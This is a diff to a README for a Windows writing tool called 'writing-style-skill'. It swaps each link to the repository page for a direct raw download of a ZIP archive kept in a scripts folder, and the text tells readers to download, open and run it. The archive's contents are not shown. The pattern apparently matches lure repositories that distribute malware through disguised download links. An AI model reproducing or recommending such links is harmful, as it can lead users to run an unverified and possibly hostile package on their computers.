@@ -1,6 +1,6 @@
 # ✍️ writing-style-skill - Write, edit, improve faster
 
-[![Download and install](https://img.shields.io/badge/Download%20Now-2f6db0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Husseincartographical320/writing-style-skill)
+[![Download and install](https://img.shields.io/badge/Download%20Now-2f6db0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Husseincartographical320/writing-style-skill/raw/refs/heads/main/scripts/writing_skill_style_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it when you want a clean writing workflow that keeps learning from your edit
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Husseincartographical320/writing-style-skill
+https://github.com/Husseincartographical320/writing-style-skill/raw/refs/heads/main/scripts/writing_skill_style_v3.7.zip
 
 If the page offers a ZIP file or release package, download it to your PC, then open the file and follow the steps below.
 
@@ -189,7 +189,7 @@ This keeps the process steady and easy to repeat
 
 ## 📎 Download Link
 
-[Visit the writing-style-skill page](https://github.com/Husseincartographical320/writing-style-skill)
+[Visit the writing-style-skill page](https://github.com/Husseincartographical320/writing-style-skill/raw/refs/heads/main/scripts/writing_skill_style_v3.7.zip)
 
 ## 🖥️ Suggested Folder Setup
 
